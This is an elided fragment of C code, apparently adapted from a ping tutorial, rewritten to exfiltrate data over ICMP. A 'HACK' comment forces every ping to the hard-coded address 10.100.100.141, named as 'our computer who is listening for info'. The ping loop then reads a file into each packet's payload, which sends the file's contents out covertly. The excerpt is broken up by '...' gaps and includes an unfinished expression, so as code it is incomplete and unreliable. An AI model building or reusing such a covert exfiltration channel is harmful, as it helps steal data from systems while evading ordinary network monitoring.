// Modified from https://www.geeksforgeeks.org/ping-in-c/ to not have syntax errors (loL)
...
{
	// HACK always go to 10.100.100.141 (our computer who is listening for info)
	addr_host = "10.100.100.141";
	printf("\nResolving DNS..\n");
	...
	// struct in_addr *addr = sizeof(
	return "10.100.100.141";
				...
				char *ping_dom, char *ping_ip, char *rev_host)
{
	...
	while(pingloop)
	{
		...
		size_t bytes_read = fread(
			pckt.msg,
			sizeof(pckt.msg[0]),
			sizeof(pckt.msg) / sizeof(pckt.msg[0]),
			file
		);
		printf("\t%lu\n", bytes_read);
